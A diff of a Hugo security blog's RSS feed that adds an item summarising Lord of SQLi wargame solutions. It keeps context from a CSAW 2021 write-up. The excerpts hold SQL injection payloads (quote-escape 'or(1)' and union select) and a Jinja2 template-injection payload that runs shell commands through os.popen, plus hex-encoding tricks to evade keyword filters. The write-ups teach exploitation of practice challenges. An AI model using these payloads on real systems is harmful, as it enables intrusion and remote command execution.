@@ -5,7 +5,18 @@
     <link>/</link>
     <description>Recent content on D@rkmod3</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Tue, 14 Sep 2021 13:13:43 +0700</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 15 Sep 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Lord of Sqli</title>
+      <link>/posts/lord_of_sqli/</link>
+      <pubDate>Wed, 15 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/lord_of_sqli/</guid>
+      <description>Day 1  Grimlin cobolt goblin orc  Grimlin To win this game, we force $result[&#39;id&#39;] return any value.
+$query = &amp;#34;select id from prob_gremlin where id=&amp;#39;{$_GET[id]}&amp;#39; and pw=&amp;#39;{$_GET[pw]}&amp;#39;&amp;#34;; I use &#39; to escape id param and add a sql command:
+id=&amp;#39;or(1)--+- # ... where id=&amp;#39;&amp;#39; or(1)-- +-and pw= id=1&amp;#39; union select &amp;#39;vietcaijvaodaycungduoc&amp;#39; --+- # try with union, huh! # ... many ways Cobolt Same with Grimlin we must do some trick to force $result[&#39;id&#39;] = &#39;admin&#39;</description>
+    </item>
+    
     <item>
       <title>CSAW - 2021</title>
       <link>/posts/csaw/</link>
@@ -17,15 +28,6 @@ http://web.chal.csaw.io:5000/submit?value={{7*7}} Okay, RCE timeeeeee~
 {{request.application.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls -la&amp;#39;).read()}} This payload import class os and executes ls -la from popen. Send this payload and we get the response:
 Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base It&amp;rsquo;s not hard to bypass this filters
  With _ we can bypass by \x5f (hex encode) With os we can bypass by \x6f\x73 With .</description>
-    </item>
-    
-    <item>
-      <title>CSAW - 2021</title>
-      <link>/posts/lord_of_sqli/</link>
-      <pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/lord_of_sqli/</guid>
-      <description></description>
     </item>
     
   </channel>
